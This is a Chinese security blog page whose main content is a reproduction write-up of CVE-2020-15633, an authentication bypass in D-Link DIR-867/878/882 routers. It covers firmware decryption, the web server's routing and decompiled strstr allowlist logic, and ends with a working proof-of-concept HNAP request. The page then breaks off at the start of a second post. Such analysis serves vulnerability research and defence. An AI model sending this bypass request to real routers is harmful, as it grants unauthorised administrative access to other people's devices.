<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"oneshell.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":true,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="ToT">
<meta property="og:type" content="website">
<meta property="og:title" content="OneShell">
<meta property="og:url" content="https://oneshell.top/index.html">
<meta property="og:site_name" content="OneShell">
<meta property="og:description" content="ToT">
<meta property="og:locale">
<meta property="article:author" content="OneShell">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://oneshell.top/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>OneShell</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">OneShell</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">I fight for a brighter tomorrow</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/09/12/CVE-2020-15633%EF%BC%9Astrstr%E5%AF%BC%E8%87%B4%E7%9A%84%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/12/CVE-2020-15633%EF%BC%9Astrstr%E5%AF%BC%E8%87%B4%E7%9A%84%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">CVE-2020-15633：strstr导致的登录认证绕过</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-12 05:27:30" itemprop="dateCreated datePublished" datetime="2023-09-12T05:27:30+08:00">2023-09-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-09-13 10:03:28" itemprop="dateModified" datetime="2023-09-13T10:03:28+08:00">2023-09-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="漏洞基本信息"><a href="#漏洞基本信息" class="headerlink" title="漏洞基本信息"></a>漏洞基本信息</h2><p>该漏洞是发生在LAN口的一个登录认证绕过漏洞，影响设备DIR-867、DIR-878、DIR-882，固件版本1.20B10_BETA。漏洞产生的原因是在处理HNAP请求的过程中，验证用户登录逻辑时处理不当，使用strstr函数来检查无需验证权限的接口，导致可以构造特定URI来绕过身份认证，从而访问敏感接口。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DIR-867, DIR-878, and DIR-882 routers with firmware 1.20B10_BETA. Authentication is not required to exploit this vulnerability. The specific flaw exists within the handling of HNAP requests. The issue results from incorrect string matching logic when accessing protected pages. An attacker can leverage this vulnerability to escalate privileges and execute code in the context of the router. Was ZDI-CAN-10835.</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>分析该漏洞使用了设备DIR-878，固件版本1.20B05，固件下载链接：<a target="_blank" rel="noopener" href="http://files.dlink.com.au/products/DIR-878/REV_A/Firmware/">files.dlink.com.au - &#x2F;products&#x2F;DIR-878&#x2F;REV_A&#x2F;Firmware&#x2F;</a></p>
<h3 id="固件获取及解密"><a href="#固件获取及解密" class="headerlink" title="固件获取及解密"></a>固件获取及解密</h3><p>该固件是存在加密的，没有办法使用binwalk直接进行解密。一般来说，总是存在最近的一个中间未加密版本固件，随后的一个版本升级才是加密固件，此时可以根据中间版本中的程序获取到固件的加解密逻辑。解密逻辑就是按照时间顺序，下载所有的固件，找到最后一个未加密的固件，并对其进行分析。</p>
<p>根据设备DIR-878的历史固件描述来看，猜测该中间版本是如下的FW104B05 Middleware.bin，实际上也的确如此。<br><img src="/images/image-2023-0913-095050557.png" alt="undifined"></p>
<p>使用binwalk解压后获取到文件系统，一般可以尝试搜索带有decrypt、encrypt这类的程序，如果找不到再继续全局搜索字符串decrypt、encrypt。这个地方直接全局搜索字符串就定位到了可能的固件解密程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r &quot;decrypt&quot; </span><br><span class="line">Binary file ./bin/imgdecrypt matches</span><br></pre></td></tr></table></figure>

<p>光这样或许还不能确定程序&#x2F;bin&#x2F;imgdecrypt是负责固件解密的，进一步继续以该程序名搜索字符串，看哪些其他程序调用了它，以及调用的命令是什么：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ grep -r &quot;imgdecrypt&quot;</span><br><span class="line">Binary file ./bin/prog.cgi matches</span><br><span class="line"></span><br><span class="line">$ strings ./bin/prog.cgi | grep &quot;imgdecrypt&quot;</span><br><span class="line">/bin/imgdecrypt /tmp/firmware.img</span><br></pre></td></tr></table></figure>

<p>这样基本上就可以确认，这个&#x2F;bin&#x2F;imgdecrypt是负责对固件进行解密的了，随后尝试使用qemu运行该程序对固件进行解密</p>
<p>使用qemu-mipsel进行用户级的仿真即可，可以看到usage是直接对固件进行解密。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo qemu-mipsel-static -L ./ ./bin/imgdecrypt</span><br><span class="line">./bin/imgdecrypt &lt;sourceFile&gt;</span><br></pre></td></tr></table></figure>

<p>解密前无法使用binwalk查看到固件信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -M ~/tmp/DIR_878_FW120B05.bin</span><br><span class="line"></span><br><span class="line">Scan Time:     2023-09-12 17:54:02</span><br><span class="line">Target File:   /home/oneshell/tmp/DIR_878_FW120B05.bin</span><br><span class="line">MD5 Checksum:  2f8e4eb7a3310da97cf9440caf084cd5</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>解密后可以使用binwalk查看到固件信息，注意解密后固件的权限是root账号所有，后续的查看、解压固件都需要使用root权限或者先修改固件权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ sudo qemu-mipsel-static -L ./ ./bin/imgdecrypt ~/tmp/DIR_878_FW120B05.bin</span><br><span class="line">key:C05FBF1936C99429CE2A0781F08D6AD8</span><br><span class="line"></span><br><span class="line">$ sudo binwalk -M ~/tmp/DIR_878_FW120B05.bin</span><br><span class="line"></span><br><span class="line">Scan Time:     2023-09-12 17:58:22</span><br><span class="line">Target File:   /home/oneshell/tmp/DIR_878_FW120B05.bin</span><br><span class="line">MD5 Checksum:  07d4fdc93ad1d270c06e1c924ee26b83</span><br><span class="line">Signatures:    411</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             uImage header, header size: 64 bytes, header CRC: 0x4934CFEF, created: 2019-05-16 07:14:42, image size: 11181071 bytes, Data Address: 0x81001000, Entry Point: 0x815FF440, data CRC: 0xA1B3FF3A, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: &quot;Linux Kernel Image&quot;</span><br><span class="line">160           0xA0            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 16562624 bytes</span><br></pre></td></tr></table></figure>

<p>如上，固件已经被成功解密了。但是这种解密依赖于后续的加密方式都是相同的，如果在中间版本采用了新的加密方式，那么还需要依次去对中间版本的解密逻辑进行分析。</p>
<h3 id="架构分析"><a href="#架构分析" class="headerlink" title="架构分析"></a>架构分析</h3><p>首先是通过分析启动项来确定webserver是什么，以及请求是怎么进行处理的。一般的方式是直接搜索常见的webserver程序名，例如lighttpd、goahead、boa、mini_httpd等等，找到相关的启动脚本或启动程序，然后一步步分析启动逻辑。此处也是这样分析到如下的启动逻辑。</p>
<ol>
<li><p>启动脚本&#x2F;etc_ro&#x2F;rcS执行程序init_system</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init_system start</span><br></pre></td></tr></table></figure>
</li>
<li><p>init_system调用lighttpd，在此之前还会启动nvram相关一些进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_system(&quot;lighttpd -f /etc_ro/lighttpd/lighttpd.conf -m /etc_ro/lighttpd/lib&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>分析lighttpd配置文件。lighttpd给我的感觉类似于nginx，只负责对相关的流量进行转发，会定义相关的路由以及处理程序。根据配置文件，可以定位到发生在路由&#x2F;HNAP1&#x2F;的请求全部是由程序&#x2F;bin&#x2F;prog.cgi进行处理的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fastcgi.server = ( </span><br><span class="line">	&quot;/HNAP1/&quot; =&gt; </span><br><span class="line">	((</span><br><span class="line">		&quot;socket&quot; =&gt; &quot;/var/prog.fcgi.socket-0&quot;,</span><br><span class="line">		&quot;check-local&quot; =&gt; &quot;enable&quot;,</span><br><span class="line">		&quot;bin-path&quot; =&gt; &quot;/bin/prog.cgi&quot;,</span><br><span class="line">		&quot;idle-timeout&quot; =&gt; 10,</span><br><span class="line">		&quot;min-procs&quot; =&gt; 1,</span><br><span class="line">		&quot;max-procs&quot; =&gt; 1</span><br><span class="line">	)), </span><br><span class="line">	......</span><br></pre></td></tr></table></figure></li>
</ol>
<p>接下来就是去逆向程序&#x2F;bin&#x2F;prog.cgi，在逆向的过程中，发现该程序可能是基于goahead更改的，因为它的一些函数命名、调用方式和goahead源码非常类似，例如在地址00429B64处，就有类似于goahead中如何对请求路径进行处理的回调函数的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">HandlersDefine</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  websSetDefaultDir(v1);</span><br><span class="line">  websSetHost(v2);</span><br><span class="line">  set_httpd_timeout();</span><br><span class="line">  websOpenServer();</span><br><span class="line">  trace(<span class="number">0</span>, <span class="string">&quot;websOpenServer \n&quot;</span>);</span><br><span class="line">  websUrlHandlerDefine(<span class="string">&quot;/&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, websSecurityHandler, <span class="number">1</span>);</span><br><span class="line">  websUrlHandlerDefine(<span class="string">&quot;/HNAP1/&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, websFormHandler, <span class="number">0</span>);</span><br><span class="line">  websUrlHandlerDefine(<span class="string">&quot;/cgi-bin&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, websCgiHandler, <span class="number">0</span>);</span><br><span class="line">  websUrlHandlerDefine(&amp;unk_4B4FFC, <span class="number">0</span>, <span class="number">0</span>, websDefaultHandler, <span class="number">2</span>);</span><br><span class="line">  trace(<span class="number">0</span>, <span class="string">&quot;websUrlHandlerDefine cgi-bin\n&quot;</span>);</span><br><span class="line">  ModuleInitUtils();</span><br><span class="line">  ModuleInitMangement();</span><br><span class="line">  ModuleInitNetwork();</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按照goahead的特性来看的话，它对于每一个请求都会先调用websSecurityHandler进行鉴权，只有当鉴权通过才会继续进入到随后相应的回调函数中进行处理。因此，对于goahead作为webserver的设备中，寻找认证绕过就要去仔细看websSecurityHandler这个函数。</p>
<h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>这篇文章的目的是进行漏洞分析，而不是漏洞挖掘，因此很多逻辑都是先通过漏洞信息大概推理出调用流程，然后再正向整理出来这个流程。这个地方直接给出结论发生漏洞的地方在地址00423ECC处的函数。<br>在函数sub_423ECC中，会比较环境变量REQUEST_URI（也就是请求路径）中是否含有字符串列表actions_list中的字符串，然后触发到return 0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_423ECC</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">57</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( index = <span class="number">0</span>; index &lt; <span class="number">0xB</span>; ++index )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(v3, <span class="number">1024</span>, <span class="string">&quot;%s%s&quot;</span>, <span class="string">&quot;http://purenetworks.com/HNAP1/&quot;</span>, &amp;actions_list[<span class="number">32</span> * index]);</span><br><span class="line">      <span class="built_in">snprintf</span>(soap_action, <span class="number">1024</span>, <span class="string">&quot;\&quot;%s%s\&quot;&quot;</span>, <span class="string">&quot;http://purenetworks.com/HNAP1/&quot;</span>, &amp;actions_list[<span class="number">32</span> * index]);</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">57</span>] &amp;&amp; <span class="built_in">strstr</span>(a1[<span class="number">57</span>], &amp;actions_list[<span class="number">32</span> * index]) )<span class="comment">// REQUEST_URI</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;actions_list[<span class="number">32</span> * index], <span class="string">&quot;/HNAP1/&quot;</span>) || !a1[<span class="number">50</span>] || <span class="built_in">strcmp</span>(a1[<span class="number">50</span>], <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( a1[<span class="number">53</span>] &amp;&amp; (!<span class="built_in">strcmp</span>(a1[<span class="number">53</span>], v3) || !<span class="built_in">strcmp</span>(a1[<span class="number">53</span>], soap_action)) )<span class="comment">// HTTP_SOAPACTION</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>字符串列表的值如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.data:004D01A0 actions_list:   .ascii &quot;GetCAPTCHAsetting&quot;&lt;0&gt;</span><br><span class="line">.data:004D01A0                                          # DATA XREF: sub_423ECC+D8↑o</span><br><span class="line">.data:004D01A0                                          # sub_423ECC+12C↑o ...</span><br><span class="line">.data:004D01B2                 .align 4</span><br><span class="line">.data:004D01C0 aGetdevicesetti_3:.ascii &quot;GetDeviceSettings&quot;&lt;0&gt;</span><br><span class="line">.data:004D01D2                 .align 4</span><br><span class="line">.data:004D01E0 aBlockedpageHtm:.ascii &quot;blockedPage.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D01F1                 .align 4</span><br><span class="line">.data:004D0200 aMobileloginHtm:.ascii &quot;MobileLogin.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D0211                 .align 4</span><br><span class="line">.data:004D0220 aLoginHtml:     .ascii &quot;Login.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D022B                 .align 5</span><br><span class="line">.data:004D0240 aEulaHtml:      .ascii &quot;EULA.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D024A                 .align 5</span><br><span class="line">.data:004D0260 aIndexHtml_2:   .ascii &quot;Index.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D026B                 .align 5</span><br><span class="line">.data:004D0280 aWizardHtml:    .ascii &quot;Wizard.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D028C                 .align 5</span><br><span class="line">.data:004D02A0 aHnap1_5:       .ascii &quot;/HNAP1/&quot;&lt;0&gt;</span><br><span class="line">.data:004D02A8                 .align 5</span><br><span class="line">.data:004D02C0 aEulaTermHtml:  .ascii &quot;EULA_Term.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D02CF                 .align 5</span><br><span class="line">.data:004D02E0 aEulaPrivacyHtm:.ascii &quot;EULA_Privacy.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D02F2                 .align 4</span><br></pre></td></tr></table></figure>

<p>然后返回到函数sub_4249EC，触发该函数继续返回0；再返回到函数websSecurityHandler中，使得该认证函数返回0。认证过程的调用链整理出来如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub_423ECC -&gt; 0</span><br><span class="line">sub_4249EC -&gt; 0</span><br><span class="line">websSecurityHandler -&gt; 0</span><br></pre></td></tr></table></figure>

<p>在goahead源码中，函数webSecurityHandler设置返回值为1时，都是和错误代码紧密相连的，如下是两个代码片段。变量nRet会在函数初始化时设置为0，当出现错误的时候，设置为1。因此，可以确定当函数webSecurityHandler函数返回0时，是代表认证通过。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">websStats.access++;</span><br><span class="line">websError(wp, <span class="number">404</span>, T(<span class="string">&quot;Page Not Found&quot;</span>));</span><br><span class="line">nRet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">websError(wp, <span class="number">401</span>, T(<span class="string">&quot;Access Denied\nUnknown User&quot;</span>));</span><br><span class="line">trace(<span class="number">3</span>, T(<span class="string">&quot;SEC: Unknown user &lt;%s&gt; attempted to access &lt;%s&gt;\n&quot;</span>), userid, path);</span><br><span class="line">nRet = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>综上所述，对于路由&#x2F;HNAP1&#x2F;，只需要在uri后添加?GetCAPTCHAsetting或者任意其他字符串列表的中字符串，就可以达到认证绕过访问该接口的目的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /HNAP1/?Login.html HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">Content-Length: 302</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">HNAP_AUTH: 00DAB25BFD3EBF8FAD03E60E5616BF44 1598580346156</span><br><span class="line">SOAPAction: &quot;http://purenetworks.com/HNAP1/GetIPv6Status&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Content-Type: text/xml; charset=UTF-8</span><br><span class="line">Origin: http://192.168.0.1</span><br><span class="line">Referer: http://192.168.0.1/Home.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: uid=uFXfaJBA</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;GetIPv6Status xmlns=&quot;http://purenetworks.com/HNAP1/&quot; /&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在分析该漏洞的过程中，先通过寻找中间未加密固件的方式，对存在漏洞的加密固件进行了解密；然后通过启动项分析定位webserver，分析配置文件梳理路由请求逻辑得到处理程序prog.cgi；最后发现prog.cgi类似goahead，根据之前对goahead认证处理的了解定位到认证逻辑，并分析漏洞的认证绕过流程。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2020/08/28/bypass_auth/">IoT 设备中身份验证绕过的一些漏洞(1) | CataLpa’s Site</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/19/FirmAE%EF%BC%9A%E7%BD%91%E7%BB%9C%E4%BB%BF%E7%9C%9F%E9%85%8D%E7%BD%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/19/FirmAE%EF%BC%9A%E7%BD%91%E7%BB%9C%E4%BB%BF%E7%9C%9F%E9%85%8D%E7%BD%AE/" class="post-title-link" itemprop="url">FirmAE：网络仿真配置</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-04-19 05:59:18" itemprop="dateCreated datePublished" datetime="2023-04-19T05:59:18+08:00">2023-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-20 11:25:53" itemprop="dateModified" datetime="2023-04-20T11:25:53+08:00">2023-04-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
